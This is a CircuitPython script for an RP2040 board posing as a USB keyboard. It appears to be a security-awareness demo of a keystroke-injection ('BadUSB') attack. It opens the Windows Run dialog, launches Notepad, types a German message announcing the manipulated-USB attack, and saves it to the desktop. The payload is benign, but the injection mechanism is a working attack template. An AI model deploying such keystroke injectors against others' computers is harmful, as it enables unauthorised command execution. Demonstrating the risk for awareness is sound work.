import usb_hid
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.keyboard import Keyboard
from time import sleep

# Adjust depending of the targetted keyboard layout
import keyboard_layout_win_de as keyboard_layout
from keycode_win_de import Keycode

# Designed for Waveshare RP2040-One
# Should also work on any RP2040 or RP2350 board

keyboard = Keyboard(usb_hid.devices)
layout = keyboard_layout.KeyboardLayout(keyboard)

keyboard.send(Keycode.WINDOWS, Keycode.D)
sleep(0.1)
keyboard.send(Keycode.WINDOWS, Keycode.R)
sleep(0.2)
layout.write("notepad")
keyboard.send(Keycode.ENTER)
sleep(0.5)
keyboard.send(Keycode.ENTER)
layout.write("Hallo,")
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.ENTER)
layout.write("Dies ist eine Demonstration eines manipulierten USB-Angriffs.")
keyboard.send(Keycode.ENTER)
layout.write("Ich habe ein Programm auf Ihrem Computer gestartet,")
keyboard.send(Keycode.ENTER)
layout.write("und schreibe nun diese Datei auf Ihren Desktop.")
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.ENTER)
keyboard.send(Keycode.CONTROL, Keycode.S)
sleep(0.5)
layout.write("%userprofile%\\Desktop")
sleep(0.3)
keyboard.send(Keycode.ENTER)
sleep(0.3)
layout.write("LÖSCH-MICH.txt")
sleep(0.3)
keyboard.send(Keycode.ENTER)